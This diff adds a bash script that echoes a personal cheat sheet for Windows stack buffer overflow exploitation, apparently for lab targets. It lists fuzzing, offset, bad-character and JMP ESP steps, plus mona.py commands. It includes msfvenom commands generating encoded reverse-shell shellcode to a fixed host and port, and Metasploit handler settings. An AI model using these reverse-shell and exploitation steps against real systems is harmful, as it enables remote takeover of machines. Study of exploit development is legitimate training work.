@@ -1,0 +1,37 @@
+#!/bin/bash
+echo """
+N.B - always start fuzzing with 1000 bytes 
+
+crash the software with specific data
+find the offset
+overwrite eip with BBBB
+then add all_chars
+find bad chars
+remove them
+find jmp esp [no need to check with that jmp esp address that overwrite eip or not ! it's useless( mane kaj kore na .... but procedure foloow koro nicher .. exploit hbe and rev shell o pbe). follow below steps blindly :D ]
+make rev-shellcode add with nops.  [ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=443 -b \"\x00\" -e x86/shikata_ga_nai -f py -v shellcode
+ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=443 -b \"\x00\" -e x86/shikata_ga_nai -f py -v shellcode ]
+
+in msfconsole :
+	exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost tun0
+	set lport 4444
+	
+=====================================================================
+
+\!mona modules
+\!mona find -s '\xff\xe4' -m 'essfunc.dll'
+or
+\!mona jmp -r esp -cpb \"ALL_BAD_CHAR\"    / \!mona jmp -r esp -m \"essfunc.dll\"
+make a folder in c:\   named mona
+\!mona config -set workingfolder c:\mona\%p
+\!mona bytearray -b \"\x00\"   /  \!mona bytearray -cpb \"\x00\"                     ==> it can be found on C:\mona\brainpan\bytearray.txt
+\!mona compare -f C:\mona\brainpan\bytearray.bin -a <ESP_ADDRESS>
+
+=======================================================================
+	JMP ESP NOT WORKING? TRY PUSH ESP
+=======================================================================
+\!mona find -s '\x54' -m 'essfunc.dll'
+"""
+
